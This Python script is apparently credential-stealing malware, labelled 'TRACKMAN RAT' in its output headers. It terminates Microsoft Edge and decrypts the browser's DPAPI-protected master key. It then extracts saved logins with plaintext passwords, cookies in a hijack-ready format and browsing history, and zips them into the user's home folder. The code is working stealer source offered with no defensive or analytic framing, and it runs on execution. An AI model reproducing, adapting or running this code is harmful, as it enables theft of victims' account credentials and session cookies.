import zipfile, time, string, random, shutil, psutil, sqlite3, base64, json, os
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")
edge_path = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Default')

def kill_edge():
    for proc in psutil.process_iter(['pid', 'name']):
        if 'msedge.exe' in proc.info['name'].lower():
            try:
                proc.terminate()
                print("Terminated Edge process:", proc.info['pid'])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

def get_master_key():
    local_state_path = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Local State')
    if not os.path.exists(local_state_path):
        print("Local State file not found.")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"Error reading Local State file: {e}")
        return None

    if "os_crypt" not in local_state:
        print("No 'os_crypt' section found in Local State.")
        return None
    if "encrypted_key" not in local_state["os_crypt"]:
        print("No 'encrypted_key' field found in 'os_crypt'.")
        return None

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Failed to decrypt the master key: {e}")
        return None
    
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return ""

def extract_data_from_db(db_path, query, process_row, temp_prefix):
    if not os.path.exists(db_path):
        return None
    temp_path = os.path.join(user, 'AppData', 'Local', 'Temp', random_filename(temp_prefix))
    shutil.copy(db_path, temp_path)
    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        result = "".join(process_row(row) for row in cursor.fetchall() if row)
        conn.close()
        return result
    finally:
        os.remove(temp_path)

def get_login_data(master_key):
    query = 'SELECT action_url, username_value, password_value FROM logins'
    def process_row(row):
        if row[0] and row[1] and row[2]:
            try:
                password = decrypt_password(row[2], master_key)
                return f"URL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n----------------------\n"
            except Exception as e:
                print(f"Error decrypting password: {e}")
                return ""
        return ""
    
    header = "------------TRACKMAN RAT BY RAYWZW------------\n"
    data = extract_data_from_db(os.path.join(edge_path, 'Login Data'), query, process_row, 'login_db')
    return header + data


def get_cookies():
    query = 'SELECT name, value, host_key, path, expires_utc FROM cookies'
    def process_row(row):
        if row[2] and row[2] != '':
            host = row[2] if row[2].startswith('.') else '.' + row[2]
            return f"{host}\tTRUE\t{row[3]}\tTRUE\t{row[4]}\t{row[0]}\t{row[1]}\n"
        return ""
    return extract_data_from_db(os.path.join(edge_path, 'Network', 'Cookies'), query, process_row, 'cookies_db')



def get_history():
    query = 'SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time ASC'
    def process_row(row):
        last_visited = time.strftime('%B, %d, %Y - %I %p', time.gmtime(row[3] / 1000000 - 11644473600))
        return f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visited: {last_visited}\n----------------------\n"
    
    header = "------------TRACKMAN RAT BY RAYWZW------------\n"
    data = extract_data_from_db(os.path.join(edge_path, 'History'), query, process_row, 'history_db')
    return header + data


def random_filename(prefix):
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"

def save_results(logins, cookies, history):
    zip_path = os.path.join(user, 'edge.zip')
    if os.path.exists(zip_path):
        os.remove(zip_path)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for name, content in [('logins.txt', logins), ('cookies.txt', cookies), ('history.txt', history)]:
            if content:
                file_path = os.path.join(user, name)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                zipf.write(file_path, name)
                os.remove(file_path)
    print(f"Saved login data, cookies, and history in {zip_path}.")

def edgethief():
    kill_edge()
    time.sleep(2)
    master_key = get_master_key()
    if not master_key:
        print("Failed to retrieve master key.")
        return
    logins = get_login_data(master_key)
    cookies = get_cookies()
    history = get_history()
    save_results(logins, cookies, history)
edgethief()
# this shit took me forever to code. thank god i figured it out